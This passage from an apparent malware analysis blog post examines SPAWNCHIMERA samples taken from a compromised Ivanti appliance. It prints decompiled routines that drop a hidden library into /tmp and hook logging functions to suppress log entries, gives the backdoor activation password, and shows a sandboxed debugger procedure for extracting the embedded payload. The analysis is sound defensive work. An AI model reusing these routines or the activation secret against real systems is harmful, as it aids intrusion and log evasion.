-----END CERTIFICATE-----

```

These certificates are :
* A self-signed certificate for va1.Ivanti.net , from 2024-07-15 
* A CA whose CN is `CN=QZf6BD2o46bq4` from 2025-03-17 11:24:37
* A certificate whose CN is `CN=vqqN9WszpAMVr` from 2025-03-17 11:24:38, signed by the CA above.
This notably leaks the binary preparation time : 2025-03-17. This is after the [JPCERT documented the SPAWNCHIMERA family](https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html), and before [Google Mandiant published on the ongoing exploitation campaign](https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability):
* 2025-02-20 https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html
* 2025-03-17 Certificate creation time.
* 2025-04-03 https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability

### 2.2.6 Unidentified binary special values

Next to the certificates above at 0x15106B are 10 uint32 integers ( 0xB5087E75, 0xA7965132, 0x7F0E2BB0, 0xB9FB8A5B, 0x91DF3E62, 0x35B6627E, 0x0CFFBD30, 0xFB0DD0E2, 0x3FA96872, 0x11D1DAC8 ) whose purpose has not been identified. The only code reference to them is a function (0xAC60) where these values get overwritten, decompiled in the screenshot below.
 
![alt text](image33.png)

While we could not understand their purpose, we’re publishing them so that future reuse of the same numbers can be tied to this malware family.

### 2.2.7 “Not all that shines is gold”, or cryptographers smuggle quotes in their code libraries

It is very common for cryptographic libraries to include test vectors for cryptographic algorithms. These would be arbitrarily chosen phrases, and they would come with the result of their decryption / encryption with a chosen key. Such readable strings should not be taken in consideration when reviewing malware samples.

For reference, this binary contained some parts of the [“Jabberwocky” poem by Lewis Carroll](https://www.poetryfoundation.org/poems/42916/jabberwocky):

* Twas brillig, and the slithy toves
* Did gyre and gimble in the wabe:
* All mimsy were the borogoves,
* And the mome raths outgrabe.

Also, the beginning of the [sunscreen essay](https://en.wikipedia.org/wiki/Wear_Sunscreen) by Pulitzer Prize winner Mary Schmich.
* Ladies and Gentlemen of the class of '99: If I could offer you only one tip for the future, sunscreen would be it.

Below is a sample screenshot of what such test strings might look like in the middle of unrelated binary data:

![alt text](image34.png)

While not relevant to this specific malware family, we couldn’t help but share that friendly reverse engineering advice for the newcomers to the malware analysis field.

### 2.2.8 Strings are always worth a read

Some functions in the binary were left with debug messages mentioning the https://github.com/kubo/funchook open-source repository. This API hooking library mentions loading disassemblers, this is very likely why we found numerous processor opcode mnemonics strings in the reviewed binaries.

```C
int call_funchook_create()
{
  char v1; // [esp-8h] [ebp-20h]
  int v2; // [esp+Ch] [ebp-Ch]

  log_msg(0, "Enter funchook_create()\n", v1);
  v2 = funchook_create();
  log_msg_2(v2, "Leave funchook_create() => %p\n", v2);
  return v2;
}
```

### 2.2.9 Calling arbitrary functions to extract embedded samples

We had spotted the embedded ELF file in the .data section of libdsupgrade.so. The `/tmp/.liblogblock.so` is mentioned from 0x90A0 which we named `real_plantliblogblock()` :
 
![alt text](image35.png)

If the file is missing, `/tmp/.liblogblock.so` is planted by the function 0x8E40 we named `plant_liblogblock_so`. Its decompiled source code is presented below :

```C
void __usercall plant_liblogblock_so(int a1@<eax>)
{
  int v1; // edx
  int v3; // eax
  char *content_liblogblock; // eax
  char *ptr; // ebp
  char *liblogblock_content; // esi
  FILE *file; // eax
  FILE *file_1; // edi
  size_t size_liblogblock; // [esp+1Ch] [ebp-30h]
  int magic[9]; // [esp+28h] [ebp-24h]

  v1 = 37;
  v3 = 0;
  magic[0] = 'KP6%';
  magic[1] = 0xA1A0A0D;
  while ( (unsigned __int8)liblogblock_key[v3] == v1 )
  {
    if ( ++v3 == 8 )
    {
      size_liblogblock = *(_DWORD *)&liblogblock_key[8];
      content_liblogblock = (char *)malloc(size_liblogblock);
      ptr = content_liblogblock;
      if ( content_liblogblock )
      {
        liblogblock_content = decrypt_liblogblock(&liblogblock_key[16], a1 - 16, content_liblogblock, size_liblogblock);
        file = fopen("/tmp/.liblogblock.so", "wb");
        file_1 = file;
        if ( file )
        {
          fwrite(ptr, 1u, (size_t)liblogblock_content, file);
          free(ptr);
          fclose(file_1);
        }
        else
        {
          free(ptr);
        }
      }
      return;
    }
    v1 = *((char *)magic + v3);
  }
}
```

What this does is look for `%6PK` followed by `0D0A1A0A` , and when it’s found, it calls another function 0x9C80:decrypt_liblogblock() to decrypt the embedded ELF file, then write it to disk.
 
 ![alt text](image36.png)
_Hexdump of the “%6PK” magic value surroundings_


Using the IDA Pro proximity browser and a lot of code reading, we understood that there was no side effects to the function supposed to decrypt/decompress and write liblogblock.so.

![alt text](image37.png)

_IDA Pro proximity browsing showing the calls from real_plantliblogblock_

Also, these functions were really complex to understand. We suppose they were implementing a version a simple compression algorithm like LZ77, but could not confirm this. As such, we elected to execute the unpacking function it from a controlled Docker container, which doesn’t even require understanding its internals.

```dockerfile
FROM ubuntu
RUN dpkg --add-architecture i386
RUN apt-get -y update
RUN apt install -qy gdb libc6:i386 zlib1g:i386
COPY libdsupgrade.so /libdsupgrade.so
COPY pwndbg_2025.05.30_amd64.deb /pwndbg_2025.05.30_amd64.deb
RUN dpkg -i /pwndbg_2025.05.30_amd64.deb
```

From a basic “ubuntu” Debian derivative, equipped with pwndbg (a set of enhancements for gdb, the reference debugger), we just had to build and run this docker container:

```shell
docker build -t "test:Dockerfile" . 
docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --network none -it "test:Dockerfile"
```

Then, load the binary in pwndbg, put a breakpoint on __libc_start_main, which is the first called function, and call “run” to launch our binary.

```shell
root@docker:/# pwndbg libdsupgrade.so
pwndbg> break __libc_start_main
pwndbg> run
Breakpoint 1, 0xf7d76cf0 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```

Great ! We now have our malware loaded in memory, paused at the very first function call.

![alt text](image38.png)

_Screenshot of the pwndbg verbose output when breakpointing on the main function_

Then, we need to locate the function we want to jump on in memory. For this, we use “info files”, or we could also use /proc/pid/maps from the Linux kernel. What matters here, is that our binary has been loaded at address 0x56555000 in memory.

```shell
pwndbg> info files
Symbols from "/libdsupgrade.so".
Native process:
	Using the running image of child process 15.
	While running this, GDB does not access memory from...
Local exec file:
	`/libdsupgrade.so', file type elf32-i386.
	Entry point: 0x5655bf24
	0x565551d4 - 0x565551e7 is .interp
	0x565551e8 - 0x56555210 is .note.gnu.property
pwndbg> !cat /proc/15/maps
56555000-5655b000 r--p 00000000 08:01 2675460                            /libdsupgrade.so
5655b000-56634000 r-xp 00006000 08:01 2675460                            /libdsupgrade.so
56634000-56695000 r--p 000df000 08:01 2675460                            /libdsupgrade.so
56695000-56699000 r--p 0013f000 08:01 2675460                            /libdsupgrade.so
56699000-566b0000 rw-p 00143000 08:01 2675460                            /libdsupgrade.so
566b0000-566c5000 rw-p 00000000 00:00 0                                  [heap]
We know 0x8e40 is the function we want to call. Let’s plant a few breakpoints can continue execution where we want it.
pwndbg> break *(0x56555000 + 0x8e40)
Breakpoint 2 at 0x5655de40
pwndbg> break *(0x56555000 + 0x8eb4)
Breakpoint 3 at 0x5655deb4
```

Now, let's divert the execution towards the function at 0x8e40. IDA Pro told us it accepted a parameter as EAX, and looking at the few calls existing to this function  suggest 0xC5D6 (found at offset 0x144300 in the file) is the required parameter, likely a file size. This might be wrong, but it correctly gets the file extracted.
 
![alt text](image39.png)

_IDA Pro mentioning an integer parameter passed as EAX_

```
pwndbg> jump *(0x56555000 + 0x8e40)
Continuing at 0x5655de40.
So before continuing, we need to set EAX to the right value.
pwndbg> set $eax = 0xc5d6
pwndbg> info registers
eax            0xc5d6              50646
Now that EAX has the right value, we can re-launch execution, launching the function we wanted until the process tries to return to an uninitialized state, causing a segmentation fault:
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf7eeb3ef in ?? () from /lib/i386-linux-gnu/libc.so.6
```

The program crashed. This is not a problem, since we got our file unpacked and written in `/tmp/.liblogblock.so` 😊

```shell
pwndbg> !ls -lta /tmp/              
total 104
-rw-r--r-- 1 root root 95092 Jun 25 13:10 .liblogblock.so
drwxrwxrwt 1 root root  4096 Jun 25 13:08 .
drwxr-xr-x 1 root root  4096 Jun 25 12:50 ..
pwndbg> !sha256sum /tmp/.liblogblock.so
3526af9189533470bc0e90d54bafb0db7bda784be82a372ce112e361f7c7b104  /tmp/.liblogblock.so
```

We just have to pull that file out of the docker container, and that’s it, we extracted liblogblock.so.

```shell
$ docker cp b5dbe42de4e8:/tmp/.liblogblock.so /tmp/
Successfully copied 96.8kB to /tmp/
$ file /tmp/.liblogblock.so
/tmp/.liblogblock.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, stripped
```

### 2.2.10 Conclusion of the libdsupgrade.so review

In this section, we demonstrated several reverse engineering techniques we elected to use to analyse this binary. Through them, we were able to determine an overall idea of the binary purposes, and also gather uniquely identifying information on the threat actor campaign : SSH keys, certificates, backdoor activation secret codes. There are still some unknowns related to this binary, but for sure it exhibits similar features to what has already been publicly documented.

Here is a summary of our findings:
* The ASCII bytes of “03970597” are the backdoor activation password, switching a connection to the web server “web” into an SSH session.
* The SSH backdoor server has a hardcoded server key, and only accepts one specific SSH key whose metadata mentions the use of the Kali Debian derivative.
* Embedded certificates with unknown purpose by the attacker were generated on 2025-03-17 11:24:37. A self-signed Ivanti certificate is also hardcoded in the binary.
* The embedded liblogblock.so, likely compressed with a  LZ77 derivative, can be extracted by calling the extraction function in a detonation VM.

## 2.3 liblogblock.so ( SPAWNSLOTH ) review

### 2.3.1 Reviewing strings always works

Starting from the entry point, we could find a handful of strings explicitly mentioned in the decompiled source code. This binary is made to be injected in "dslogserver", as depicted by the decompiled function below.

```C
int check_dslogserver_procname()
{
  int result; // eax
  pthread_t newthread[4]; // [esp+0h] [ebp-10h] BYREF

  result = strcmp(_progname, "dslogserver");
  if ( !result )
  {
    do_syslog_servers_exist_mention();
    result = pthread_create(newthread, 0, (void *(*)(void *))MAIN_THREAD, 0);
    if ( !result )
      return pthread_detach(newthread[0]);
  }
  return result;
}
```

The `do_syslog_servers_exist_mention` function, named by us, locates the `g_do_syslog_servers_exist` and `_ZN5DSLog4File3addEPKci` (`DSLog::File::add`) functions. We presume both functions are getting altered to prevent log entries from being sent, since the filename is liblogblock.

```C
int do_syslog_servers_exist_mention()
{
  int tmp_memsegment; // eax
  __time_t *mem; // esi
  __time_t tv_sec; // eax
  __time_t *v3; // eax
  _DWORD *located_function; // esi
  int result; // eax
  struct timespec tp; // [esp+0h] [ebp-14h] BYREF

  g_do_syslog_servers_exist_address = (int)dlsym(0, "g_do_syslog_servers_exist");
  tmp_memsegment = get_tmp_memsegment();
  if ( tmp_memsegment == -1 )
    return -1;
  mem = (__time_t *)shmat(tmp_memsegment, 0, 0);
  if ( !mem )
    return -1;
  clock_gettime(0, &tp);
  tv_sec = tp.tv_sec;
  mem[1] = 0;
  *mem = tv_sec;
  v3 = (__time_t *)g_do_syslog_servers_exist_address;
  if ( g_do_syslog_servers_exist_address )
  {
    mem[3] = g_do_syslog_servers_exist_address;
    mem[2] = *v3;
  }
  shmdt(mem);
  lib_address = (int)dlsym(0, "_ZN5DSLog4File3addEPKci");// DSLog::File::add
  located_function = call_mmap_locate();
  if ( sub_161F(located_function, (void **)&lib_address, (int)call_lib_from_shared_mem) )
    return -1;
  result = call_mprotect_filename((int)located_function);
  if ( result )
    return -1;
  return result;
}
```


### 2.3.2 Classical binary layout proves useful once again

Also, based on the strings layout in the binary, we presume this binary serves no other purpose. The “.rodata” section starts with relevant strings, then followed by constant strings from an unidentified assembly-related library

![alt text](image40.png)

_Useful strings found in liblogblock.so_

Below is a screenshot of the unidentified assembly-related library strings. These words are assembly operation mnemonics. See https://www.felixcloutier.com/x86/ where a listing of the existing x86 and amd64 instructions is presented.

![alt text](image41.png)

_Assembly instructions found in liblogblock.so_

Finally, taking a direct look at the structures in memory next to the embedded strings was useful to locate other potentially relevant functions, tied with a specific constant 0xD4 which we suppose being an offset within a loaded library.
 
![alt text](image42.png)

### 2.3.3 Conclusion of the liblogblock.so review

Once again, simply looking at the readable strings ordering was enough to scope the purpose of an unknown binary. Having such an obvious filename along with preliminary work from other researchers definitely helps as well.

We found that liblogblock.so:

* is designed to be injected in the `dslogserver` process
* has the capability to hook or alter functions 
* has no specific obfuscation in place, and is pretty minimally tied to its purpose

## 2.4 Conclusion of the reverse engineering exercise

We reviewed three malware samples tied with the SPAWNCHIMERA family and found behaviour similar to what was previously documented by Mandiant and the JPCERT. They all had hardcoded constants tying them to specific versions of the Ivanti server operating system, or to specific attacker-controlled keys. It is worth mentioning that some of these specific attacker constants were reused over time, such as the server SSH key, while other like the secret activation string `03970597` has changed over different versions of their malware.

This malware breed is highly specialized to not only achieve persistence on Ivanti appliances across reboots and OS upgrades, but also deter simple detection mechanisms meant to be used by system administrators. 

We also managed to extract a timestamp out of a DER-encoded x509 certificate embedded in a binary. It was generated on 2025-03-17 11:24:37, which is roughly a month before the compromise of the server we investigated.

Most of this analysis was made easier than what it could have been thanks to the maturity of reverse engineering tools, the open-source community sharing excellent libraries like pwndbg or entire operating systems like Debian, and most importantly the published documentation on this campaign made by public and private actors.

We hope this blog post adds valuable information to the existing documentation on the SPAWNCHIMERA malware campaign used by the UNC5221 threat actor (also known to the industry as GOTHIC PANDA or BROCADE TYPHOON).
 
## 3 - References
Ordered by time, these are relevant online publications related to this campaign.
* 2024-01-11 1/4 https://cloud.google.com/blog/topics/threat-intelligence/suspected-apt-targets-ivanti-zero-day  SPAWNMOLE=ZIPLINE=( pass = "SSH-2.0-OpenSSH_0.3xx" )
* 2024-01-13     https://labs.watchtowr.com/welcome-to-2024-the-sslvpn-chaos-continues-ivanti-cve-2023-46805-cve-2024-21887/ 
* 2024-01-31 2/4 https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-zero-day-exploitation  ZIPLINE=SPAWNMOLE
* 2024-02-27 3/4 https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-exploitation-persistence 
* 2024-04-04 4/4 https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement  SPAWNSLOTH SPAWNMOLE ( 0xfb49e3e2 + 0x1bc38361 key ) SPAWNANT
* 2025-01-08     https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day  SPAWNANT installer, SPAWNMOLE tunneler, and the SPAWNSNAIL SSH backdoor, mentions "svb" which we saw
* 2025-01-10     https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/ 
* 2025-02-20     https://www.virustotal.com/gui/file/b1221000f43734436ec8022caaa34b133f4581ca3ae8eccd8d57ea62573f301d/community  our SPAWNSNARE busybox sample 
* 2025-02-20 https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html
* 2025-03-28 https://www.cisa.gov/news-events/alerts/2025/03/28/cisa-releases-malware-analysis-report-resurge-malware-associated-ivanti-connect-secure 
* 2025-04-03     https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability  SPAWNSNARE SPAWNMOLE SPAWNSLOTH SPAWNANT
* 2025 ?         https://northwave-cybersecurity.com/whitepapers-articles/investigating-a-possible-ivanti-compromise 
* 2025-04        https://northwave-cybersecurity.com/resources/insights/how-to-conduct-forensic-investigation-ivanti-devices 
* 2025-04-24 https://blogs.jpcert.or.jp/en/2025/04/dslogdrat.html 
* https://malpedia.caad.fkie.fraunhofer.de/details/elf.spawnsnare 
* https://github.com/kubo/funchook  ( used in SPAWNMOLE )
* https://github.com/NorthwaveSecurity/lilo-pulse-secure-decrypt  ( used to decrypt the keys )
